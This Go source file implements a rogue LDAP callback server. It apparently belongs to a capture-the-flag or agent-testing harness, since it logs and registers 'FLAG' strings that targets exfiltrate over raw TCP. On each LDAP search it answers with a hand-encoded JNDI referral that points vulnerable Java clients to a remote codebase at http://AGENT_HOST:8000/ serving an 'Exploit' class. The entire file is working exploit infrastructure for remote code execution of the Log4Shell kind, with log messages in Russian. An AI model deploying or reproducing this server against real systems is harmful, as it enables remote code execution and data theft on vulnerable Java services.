package oob

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

var (
	ldapListener net.Listener
)

func getAgentHost() string {
	val := os.Getenv("AGENT_HOST")
	if val != "" {
		return val
	}
	return "127.0.0.1"
}

// StartLDAPCallbackListener starts a TCP listener on port :1389 to simulate LDAP referrals
func StartLDAPCallbackListener() {
	var err error
	ldapListener, err = net.Listen("tcp", ":1389")
	if err != nil {
		fmt.Printf("[!] Не удалось запустить LDAP-слушатель на порту :1389: %v\n", err)
		return
	}
	go func() {
		for {
			conn, err := ldapListener.Accept()
			if err != nil {
				return // Listener stopped
			}
			go handleLDAPConnection(conn)
		}
	}()
}

func handleLDAPConnection(conn net.Conn) {
	defer conn.Close()

	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	for {
		buf := make([]byte, 2048)
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		if n < 7 {
			continue
		}

		// Check if this is a raw TCP callback exfiltrating the flag
		if strings.HasPrefix(string(buf[:n]), "FLAG") {
			flag := strings.TrimSpace(string(buf[:n]))
			fmt.Printf("[LDAP SERVER] >>> ПЕРЕХВАЧЕН СЕКРЕТНЫЙ ФЛАГ ЧЕРЕЗ TCP: %s <<<\n", flag)
			RegisterCallback(flag)
			return
		}

		// Validate sequence tag
		if buf[0] != 0x30 {
			return
		}

		headerLen := 2
		if buf[1]&0x80 != 0 {
			headerLen += int(buf[1] & 0x7f)
		}

		if n <= headerLen || buf[headerLen] != 0x02 {
			return
		}
		intLen := int(buf[headerLen+1])
		if n <= headerLen+1+intLen {
			return
		}
		msgID := buf[headerLen+1+intLen]

		// ProtocolOp tag is located at headerLen + 2 + intLen
		protocolOpIdx := headerLen + 2 + intLen
		if n <= protocolOpIdx {
			return
		}
		protocolOp := buf[protocolOpIdx]

		if protocolOp == 0x60 { // BindRequest
			fmt.Println("[LDAP SERVER] Получен LDAP BindRequest. Отправка BindResponse...")
			bindResponseContent := []byte{0x0a, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00}
			bindResponseHeader := append([]byte{0x61}, encodeBERLength(len(bindResponseContent))...)
			bindResponseEnvelope := append([]byte{0x02, 0x01, msgID}, append(bindResponseHeader, bindResponseContent...)...)
			bindResponseMessage := append([]byte{0x30}, encodeBERLength(len(bindResponseEnvelope))...)
			bindResponseMessage = append(bindResponseMessage, bindResponseEnvelope...)

			_, err = conn.Write(bindResponseMessage)
			if err != nil {
				return
			}
			continue
		}

		if protocolOp == 0x63 { // SearchRequest
			fmt.Println("[LDAP SERVER] Получен LDAP SearchRequest. Отправка JNDI Referral...")
			agentHost := getAgentHost()
			codebase := fmt.Sprintf("http://%s:8000/", agentHost)

			// Construct raw BER packet for LDAP SearchResultEntry pointing to codebase/Exploit
			codebaseBytes := []byte(codebase)
			attrCodebase := buildLDAPAttribute("javaCodeBase", codebaseBytes)
			attrClassName := buildLDAPAttribute("javaClassName", []byte("Exploit"))
			attrFactory := buildLDAPAttribute("javaFactory", []byte("Exploit"))
			attrObjectClass := buildLDAPAttribute("objectClass", []byte("javaNamingReference"))

			attrsSeq := append(attrObjectClass, attrCodebase...)
			attrsSeq = append(attrsSeq, attrClassName...)
			attrsSeq = append(attrsSeq, attrFactory...)

			attrsSeqHeader := append([]byte{0x30}, encodeBERLength(len(attrsSeq))...)
			attrsBlock := append(attrsSeqHeader, attrsSeq...)

			objName := []byte{0x04, 0x01, 'a'}

			sreContent := append(objName, attrsBlock...)
			sreHeader := append([]byte{0x64}, encodeBERLength(len(sreContent))...)
			srePacketContent := append(sreHeader, sreContent...)

			sreEnvelope := append([]byte{0x02, 0x01, msgID}, srePacketContent...)
			sreMessage := append([]byte{0x30}, encodeBERLength(len(sreEnvelope))...)
			sreMessage = append(sreMessage, sreEnvelope...)

			_, err = conn.Write(sreMessage)
			if err != nil {
				return
			}

			// Send SearchResultDone (0x65)
			srdContent := []byte{0x0a, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00}
			srdHeader := append([]byte{0x65}, encodeBERLength(len(srdContent))...)
			srdEnvelope := append([]byte{0x02, 0x01, msgID}, append(srdHeader, srdContent...)...)
			srdMessage := append([]byte{0x30}, encodeBERLength(len(srdEnvelope))...)
			srdMessage = append(srdMessage, srdEnvelope...)

			_, _ = conn.Write(srdMessage)
			time.Sleep(500 * time.Millisecond)
			return
		}

		return
	}
}

func buildLDAPAttribute(name string, value []byte) []byte {
	desc := append([]byte{0x04}, encodeBERLength(len(name))...)
	desc = append(desc, []byte(name)...)

	valStr := append([]byte{0x04}, encodeBERLength(len(value))...)
	valStr = append(valStr, value...)

	set := append([]byte{0x31}, encodeBERLength(len(valStr))...)
	set = append(set, valStr...)

	seq := append(desc, set...)
	seqHeader := append([]byte{0x30}, encodeBERLength(len(seq))...)
	return append(seqHeader, seq...)
}

func encodeBERLength(length int) []byte {
	if length < 128 {
		return []byte{byte(length)}
	}
	if length < 256 {
		return []byte{0x81, byte(length)}
	}
	return []byte{0x82, byte(length >> 8), byte(length & 0xff)}
}

// StopLDAPCallbackListener stops the LDAP listener
func StopLDAPCallbackListener() {
	if ldapListener != nil {
		_ = ldapListener.Close()
	}
}
